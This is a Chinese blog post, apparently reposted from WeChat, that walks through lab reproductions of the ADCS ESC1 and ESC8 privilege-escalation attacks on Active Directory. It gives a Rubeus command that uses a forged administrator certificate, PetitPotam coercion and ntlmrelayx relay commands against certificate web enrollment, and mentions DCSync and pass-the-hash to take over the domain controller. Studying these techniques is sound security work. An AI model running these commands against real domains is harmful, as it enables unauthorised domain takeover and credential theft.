> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PuMpRTiHjkXUJrmmwqG_mg)

**对原理感兴趣的可以去**

**https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf**

**看原文，这里只记录复现过程  
**

**ADCS 漏洞 --ESC1**

在 ADCS 中，错误配置会导致普通域用户到域管理员的提权。主要体现在证书模板这里，在证书模板中，我们可以设置应用程序的策略。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEuszSqqiaVSaNpzYCNMKUBbAqicEiawO24azBj9AxD1S4SCDtxlKflOmBw4Q/640?wx_fmt=png)

我们比较关心的如下：

```
Client Authentication (OID 1.3.6.1.5.5.7.3.2)
PKINIT Client Authentication (1.3.6.1.5.2.3.4)
Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)
Any Purpose (OID 2.5.29.37.0)
```

这些可以使得我们拥有请求票据的功能，然后就是 SAN 的模拟，SAN 允许我们使用 UPN 来指定用户，来达到用户模拟的目的。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusibFBxdTfeicyDdxTJQOcgB6KmmcoTiaUouw2X8gZjmtG2U8a5suLTRWkw/640?wx_fmt=png)

其 LDAP 查询语句如下：

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextend edkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4) (pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

使用其发布的测试工具，PSPKIAudit 测试显示存在 ESC1 漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusF5FzobuSg4AQFlMRiaHico1Gzgvs2zNOL7MQOz3pwZKydQuWqDSCwGsg/640?wx_fmt=png)

攻击步骤

首先申请一张证书，并将 upn 名称改成域管

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEuseln3QOd0gVxUxEm4LSY1FzbT9TlBjlZb1KykY1FmwuTn7lh0dkRHkA/640?wx_fmt=png)

然后导出证书

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusytWHicMECIIIE2fjGkX80Jo9cJ039yz40o4W2pF8LLwRzdqFicRS1LeA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusR4kPiaLM549BTYV1eiamgf9sPNgoQyAuwMicwV4MIF2CedUmQW18eDnpA/640?wx_fmt=png)

用密码导出

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusvRpibvZaPpwv0SQrmLLj6ib6TicP1Lk6bDYjPEwVYb4HS2T8oLn5SCULg/640?wx_fmt=png)

然后使用 rubeus 攻击。

```
Rubeus.exe asktgt /user:administrator /certificate:3.pfx /password:123456 /ptt
```

*   /user：模拟的账户
    
*   /certificate：申请的证书
    
*   /password：证书密码
    

成功获取域控权限

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEus5BDTQQplXCtm1RRAq9U76VnyMK1D9a9pJGXgbibkWiaOGtfsibSrh06XA/640?wx_fmt=png)

**ADCS 漏洞 --ESC8**

也就是你们说的 adcs relay。

ESC8 是一个 http 的 ntlm relay，原因在于 ADCS 的认证中支持 ntlm 认证，再具体的自己看白皮书。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEus61dyQMHZ22Yndu7VYFld6eDswLicy8ETR1VQaib4GcmZfvmI1KFQRv6A/640?wx_fmt=png)

默认即存在

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusEA6ZZU9xdYO1LmicSj049hfTrCcCR6lop6l5dYjzYBstWQ5yDhs2iaPg/640?wx_fmt=png)

下面开始攻击复现，首先我们需要搭建一个辅助域控

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEus3dbLGMY9vJpYKBdjUtjO9A0cbgM4NOXAyEibOR79RAZKSD07iaqpUVNQ/640?wx_fmt=png)

勾选域服务

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusnWp2JGVTaibRiaPgsIEo0gjwV47BcMBmhicJU7fdL67t59bxhgbyib4SoA/640?wx_fmt=png)

安装即可，同理设置为域控

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusN0Mlg4qfaibA2tJ2SvptM7keVsDZAI2aJ9NF6OtZVEwJHRxicabFiaOQw/640?wx_fmt=png)

选择添加到现有域

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusddSS2WqcPDIKbBMGPt43VcE1hwxp3ntjdndTMagyEWIvBf2VrWdJ0g/640?wx_fmt=png)

选择从主域复制

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusUdnoYw8qO041osk2pxSH88kWo0dbw0ceCDkd7tXcPpMpLibHakm1fmQ/640?wx_fmt=png)

重启后测试

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusomz1tR3lv5KfOGqc0HZcxPfAXHqxBkaFYWpEViaQTSTLYuWRqgRNVjw/640?wx_fmt=png)

下面即可开始攻击。

```
python3 Petitpotam.py -u '' -d '' -p '' "ntlmrelay address" "DC02 address"
```

```
ntlmrelayx.py -t http://adcs/certsrv/certfnsh.asp -smb2support --adcs --template 'DCTest'
```

获取到证书

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusicIyXgN52JHtaufPz2aom5IJLCpMKrrJsxgX6wj4MbIU9ibiafLGS6oFA/640?wx_fmt=png)

然后使用证书请求 DC02$ 的票据

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusm10F2lFVOHn6icsosEH5z9ngllAic2Vs464t4oMLkVbeibZO5x6WHDb0w/640?wx_fmt=png)

获取票据成功

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEus9OpKNuiaVQg0RunjzP5gHvVBL5sJ9L6fmwtWkSTu3pwRicyhZ0DnYYYA/640?wx_fmt=png)

mimikatz 进行 dcsync

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEus4YdvZS2k7JfXhMkbXLq0QezIPWsXT7pSEkKZrujNzHmZoXWIojrqnQ/640?wx_fmt=png)

然后进行 pth 攻击，获取主域控权限

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08UdUyrShoub2KTEziaxibicEusnu0JEOKMqwSbXJAbHOLE5XRynpyg5ibtWqhtRPCP3VDYPZEp3tKqRcA/640?wx_fmt=png)

出现错误的话可以参考：

https://github.com/SecureAuthCorp/impacket/pull/1101

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)